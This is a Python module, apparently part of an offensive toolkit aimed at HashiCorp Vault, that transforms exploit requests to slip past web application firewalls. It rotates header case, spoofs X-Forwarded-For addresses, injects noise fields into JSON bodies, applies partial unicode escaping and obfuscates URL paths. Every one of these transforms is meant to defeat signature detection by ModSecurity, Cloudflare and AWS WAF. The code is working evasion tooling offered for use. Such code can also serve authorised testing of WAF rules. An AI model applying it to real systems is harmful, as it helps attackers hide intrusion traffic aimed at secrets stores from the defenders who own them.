"""WAF evasion & payload obfuscation layer for active-execution modules.

Provides automatic request transformation before every Vault API call.
A WAF (ModSecurity, Cloudflare, AWS WAF) or reverse proxy (NGINX,
HAProxy) sitting in front of Vault can detect exploit patterns via
signature matching, header fingerprinting, and body inspection.

This module injects obfuscation into three dimensions:

1. **JSON body** — noise fields, key shuffle, whitespace variation,
   unicode escaping to break signature patterns.
2. **URL path** — double-slash, dot-segments, trailing-slash toggling,
   selective percent-encoding to vary request URL signatures.
3. **HTTP headers** — Content-Type variation, X-Forwarded-For spoofing,
   benign UUID header injection, Accept variation, header-case rotation.

All techniques are Vault-API-safe: Vault's Go HTTP server normalises
double-slashes and dot-segments, ignores unknown JSON fields, and
accepts Content-Type charset variations.

Usage::

    from active_execution.waf_evasion import enable_waf_evasion, set_waf_evasion_profile, WAFEvasionProfile

    enable_waf_evasion()
    set_waf_evasion_profile(WAFEvasionProfile.MODERATE)
    # All subsequent vault_request() calls are now obfuscated.

The hook is in ``core/tls_config.vault_request()`` — no module changes
needed.  Disable with ``disable_waf_evasion()``.
"""

from __future__ import annotations

import random
import string
import threading
import uuid
from enum import Enum
from typing import Any
from urllib.parse import urlparse, quote


# ---------------------------------------------------------------------------
# Profile enum
# ---------------------------------------------------------------------------


class WAFEvasionProfile(str, Enum):
    """Evasion intensity for WAF bypass techniques."""
    NONE = "none"              # evasion disabled
    LIGHT = "light"            # body noise + header diversity
    MODERATE = "moderate"      # + path obfuscation + XFF spoof
    AGGRESSIVE = "aggressive"  # + unicode escape + full path encoding


# ---------------------------------------------------------------------------
# Profile configuration
# ---------------------------------------------------------------------------


_EVASION_PROFILES: dict[WAFEvasionProfile, dict[str, Any]] = {
    WAFEvasionProfile.NONE: {
        "body_noise_fields": 0,
        "body_shuffle_keys": False,
        "body_whitespace_vary": False,
        "body_unicode_escape": False,
        "path_double_slash": False,
        "path_trailing_slash": False,
        "path_url_encode": False,
        "header_content_type_vary": False,
        "header_xff_spoof": False,
        "header_benign_inject": False,
        "header_case_vary": False,
    },
    WAFEvasionProfile.LIGHT: {
        "body_noise_fields": 2,
        "body_shuffle_keys": True,
        "body_whitespace_vary": False,
        "body_unicode_escape": False,
        "path_double_slash": False,
        "path_trailing_slash": False,
        "path_url_encode": False,
        "header_content_type_vary": True,
        "header_xff_spoof": False,
        "header_benign_inject": True,
        "header_case_vary": False,
    },
    WAFEvasionProfile.MODERATE: {
        "body_noise_fields": 4,
        "body_shuffle_keys": True,
        "body_whitespace_vary": True,
        "body_unicode_escape": False,
        "path_double_slash": True,
        "path_trailing_slash": True,
        "path_url_encode": False,
        "header_content_type_vary": True,
        "header_xff_spoof": True,
        "header_benign_inject": True,
        "header_case_vary": True,
    },
    WAFEvasionProfile.AGGRESSIVE: {
        "body_noise_fields": 6,
        "body_shuffle_keys": True,
        "body_whitespace_vary": True,
        "body_unicode_escape": True,
        "path_double_slash": True,
        "path_trailing_slash": True,
        "path_url_encode": True,
        "header_content_type_vary": True,
        "header_xff_spoof": True,
        "header_benign_inject": True,
        "header_case_vary": True,
    },
}

# ── Private noise-field name pool ──────────────────────────────────────
_NOISE_NAMES: list[str] = [
    "_r", "_ts", "_nonce", "_id", "_seq", "_ctx",
    "_tag", "_ver", "_src", "_tid", "_sid", "_req",
]

# ── Content-Type variants ──────────────────────────────────────────────
_CONTENT_TYPE_VARIANTS: list[str] = [
    "application/json",
    "application/json; charset=utf-8",
    "application/json;charset=UTF-8",
    "application/json; charset=UTF-8",
]

# ── Accept header variants ─────────────────────────────────────────────
_ACCEPT_VARIANTS: list[str] = [
    "application/json",
    "*/*",
    "application/json, text/plain, */*",
    "application/json, */*;q=0.8",
]


# ---------------------------------------------------------------------------
# WAF Evasion Engine
# ---------------------------------------------------------------------------


class WAFEvasionEngine:
    """Transforms HTTP requests to evade signature-based WAF detection.

    Applies configurable obfuscation to the JSON body, URL path, and
    HTTP headers.  The profile controls which techniques are active.
    """

    def __init__(self, profile: WAFEvasionProfile = WAFEvasionProfile.NONE):
        self._profile = profile
        self._cfg = _EVASION_PROFILES.get(profile, _EVASION_PROFILES[WAFEvasionProfile.NONE])
        self._request_count: int = 0
        self._lock = threading.Lock()

    # ── public API ──────────────────────────────────────────────────────

    def transform_request(
        self,
        method: str,
        full_url: str,
        headers: dict[str, str] | None,
        json_body: dict[str, Any] | None,
    ) -> tuple[str, str, dict[str, str], dict[str, Any] | None]:
        """Transform a request by applying all active evasion techniques.

        Returns (method, url, headers, json_body) — the caller should
        use the returned values for the actual HTTP call.

        Parameters
        ----------
        method: HTTP method (GET, POST, PUT, DELETE, LIST).
        full_url: Complete URL including scheme, host, port, and path.
        headers: Current request headers (may be None).
        json_body: Current JSON body (may be None for GET/HEAD requests).
        """
        with self._lock:
            self._request_count += 1

        # 1. Obfuscate URL path
        url = self._obfuscate_url(full_url)

        # 2. Obfuscate JSON body
        body = self._obfuscate_body(json_body)

        # 3. Diversify headers
        hdrs = self._diversify_headers(headers or {})

        return method, url, hdrs, body

    def reconfigure(self, profile: WAFEvasionProfile):
        """Switch evasion profile at runtime."""
        self._profile = profile
        self._cfg = _EVASION_PROFILES.get(profile, _EVASION_PROFILES[WAFEvasionProfile.NONE])

    @property
    def profile(self) -> WAFEvasionProfile:
        return self._profile

    @property
    def status(self) -> dict:
        return {
            "profile": self._profile.value,
            "request_count": self._request_count,
            "active_techniques": {
                k: v for k, v in self._cfg.items()
                if v and isinstance(v, bool)
            },
        }

    # ── URL path obfuscation ────────────────────────────────────────────

    def _obfuscate_url(self, full_url: str) -> str:
        """Obfuscate the path portion of a URL while preserving host/port."""
        parsed = urlparse(full_url)
        path = parsed.path or "/"

        # Remove leading /v1 prefix for obfuscation, then re-add
        v1_prefix = ""
        if path.startswith("/v1/"):
            v1_prefix = "/v1"
            path = path[3:]  # remove "/v1"
        elif path == "/v1":
            # Just /v1 with no sub-path — return as-is
            return full_url

        segments = [s for s in path.split("/") if s]

        if self._cfg.get("path_double_slash"):
            # Insert an empty segment (creates //) at a random position
            if segments and random.random() < 0.5:
                idx = random.randint(0, len(segments))
                segments.insert(idx, "")

        if self._cfg.get("path_trailing_slash"):
            # Toggle trailing slash
            if random.random() < 0.5 and not parsed.path.endswith("/"):
                path = "/" + "/".join(s for s in segments if s) + "/"
            else:
                path = "/" + "/".join(s for s in segments if s)

        if self._cfg.get("path_url_encode") and segments:
            # URL-encode one random segment
            idx = random.randint(0, len(segments) - 1)
            if segments[idx]:
                # Only encode first character to avoid breaking path routing
                seg = segments[idx]
                encoded = quote(seg[0]) + seg[1:]
                segments[idx] = encoded

        # Rebuild path
        if v1_prefix:
            path = v1_prefix + "/" + "/".join(s for s in segments if s or s == "")
        else:
            path = "/" + "/".join(s for s in segments if s or s == "")

        if not path.startswith("/"):
            path = "/" + path

        # Reconstruct full URL
        result = parsed._replace(path=path).geturl()
        # Strip trailing ? (urlparse adds it for empty query)
        if full_url.endswith("/") and not result.endswith("/"):
            result += "/"
        return result

    # ── JSON body obfuscation ───────────────────────────────────────────

    def _obfuscate_body(self, body: dict[str, Any] | None) -> dict[str, Any] | None:
        """Obfuscate a JSON body to evade WAF signature matching."""
        if body is None:
            return None

        result = dict(body)  # shallow copy

        # Noise injection
        noise_count = self._cfg.get("body_noise_fields", 0)
        if noise_count > 0:
            used_names = set(result.keys())
            available = [n for n in _NOISE_NAMES if n not in used_names]
            for i in range(min(noise_count, len(available))):
                name = available[i]
                # Use varied noise values: timestamps, random strings, small ints
                val_type = random.randint(0, 3)
                if val_type == 0:
                    result[name] = "".join(
                        random.choices(string.ascii_lowercase + string.digits, k=8)
                    )
                elif val_type == 1:
                    result[name] = random.randint(1000, 99999)
                elif val_type == 2:
                    import time
                    result[name] = int(time.time() * 1000)
                else:
                    result[name] = str(uuid.uuid4())[:8]

        # Key shuffle: rebuild dict in random order
        if self._cfg.get("body_shuffle_keys"):
            keys = list(result.keys())
            random.shuffle(keys)
            result = {k: result[k] for k in keys}

        # Unicode escape on string values (partial — only first char)
        if self._cfg.get("body_unicode_escape"):
            result = self._unicode_escape_values(result)

        # Whitespace variation is applied by the caller when serializing.
        # We store the preference so vault_request() can use it.
        # (No-op at dict level — handled at serialization time.)
        result["__waf_compact__"] = not self._cfg.get("body_whitespace_vary") or random.random() < 0.5
        # Clean up metadata before returning — caller strips this key
        return result

    @staticmethod
    def _unicode_escape_values(obj: Any) -> Any:
        """Recursively apply partial unicode escaping to string values."""
        if isinstance(obj, dict):
            return {
                k: WAFEvasionEngine._unicode_escape_values(v)
                for k, v in obj.items()
            }
        if isinstance(obj, list):
            return [WAFEvasionEngine._unicode_escape_values(v) for v in obj]
        if isinstance(obj, str) and len(obj) > 0:
            # Escape only the first character 50% of the time
            if random.random() < 0.5 and obj[0].isalpha():
                return f"\\u{ord(obj[0]):04x}" + obj[1:]
        return obj

    # ── Header diversification ──────────────────────────────────────────

    def _diversify_headers(self, headers: dict[str, str]) -> dict[str, str]:
        """Diversify HTTP headers to avoid fingerprinting."""
        result = dict(headers)

        # Content-Type variation
        if self._cfg.get("header_content_type_vary"):
            ct = random.choice(_CONTENT_TYPE_VARIANTS)
            result["Content-Type"] = ct

        # X-Forwarded-For spoofing
        if self._cfg.get("header_xff_spoof"):
            # Generate a random RFC 1918 private IP
            subnet = random.choice(["10", "172.16", "192.168"])
            if subnet == "10":
                ip = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            elif subnet == "172.16":
                ip = f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            else:
                ip = f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"
            result["X-Forwarded-For"] = ip

        # Benign header injection (realistic UUIDs)
        if self._cfg.get("header_benign_inject"):
            tid = str(uuid.uuid4())
            if random.random() < 0.5:
                result["X-Request-ID"] = tid
            if random.random() < 0.5:
                result["X-Trace-Id"] = tid
            if random.random() < 0.5 or (
                "X-Request-ID" not in result and "X-Trace-Id" not in result
            ):
                result["X-Correlation-Id"] = str(uuid.uuid4())

        # Accept variation
        if self._cfg.get("header_content_type_vary"):
            result["Accept"] = random.choice(_ACCEPT_VARIANTS)

        # Header case variation
        if self._cfg.get("header_case_vary"):
            result = self._vary_header_case(result)

        return result

    @staticmethod
    def _vary_header_case(headers: dict[str, str]) -> dict[str, str]:
        """Randomly change header name casing (HTTP headers are case-insensitive)."""
        result: dict[str, str] = {}
        for key, value in headers.items():
            # Vary case for ~30% of headers
            if random.random() < 0.3 and "-" in key:
                parts = key.split("-")
                new_parts = [
                    p.lower() if random.random() < 0.5 else p.capitalize()
                    for p in parts
                ]
                result["-".join(new_parts)] = value
            else:
                result[key] = value
        return result


# ---------------------------------------------------------------------------
# Global state
# ---------------------------------------------------------------------------

_EVASION_ENABLED: bool = False
_current_profile: WAFEvasionProfile = WAFEvasionProfile.NONE
_engine: WAFEvasionEngine | None = None
_engine_lock = threading.Lock()


def get_evasion_engine() -> WAFEvasionEngine:
    """Get or lazily create the global :class:`WAFEvasionEngine`."""
    global _engine
    if _engine is not None:
        return _engine
    with _engine_lock:
        if _engine is None:
            _engine = WAFEvasionEngine(profile=_current_profile)
        return _engine


def enable_waf_evasion():
    """Activate WAF evasion globally.

    All subsequent ``vault_request()`` calls will be obfuscated.
    """
    global _EVASION_ENABLED
    _EVASION_ENABLED = True
    # Ensure engine exists
    get_evasion_engine()


def disable_waf_evasion():
    """Deactivate WAF evasion globally.

    Requests revert to direct ``vault_request()`` with no obfuscation.
    """
    global _EVASION_ENABLED
    _EVASION_ENABLED = False


def is_waf_evasion_enabled() -> bool:
    """Check whether WAF evasion is currently active."""
    return _EVASION_ENABLED


def set_waf_evasion_profile(profile: WAFEvasionProfile):
    """Switch WAF evasion profile at runtime."""
    global _current_profile
    _current_profile = profile
    engine = get_evasion_engine()
    engine.reconfigure(profile)


def get_waf_evasion_profile() -> WAFEvasionProfile:
    return _current_profile
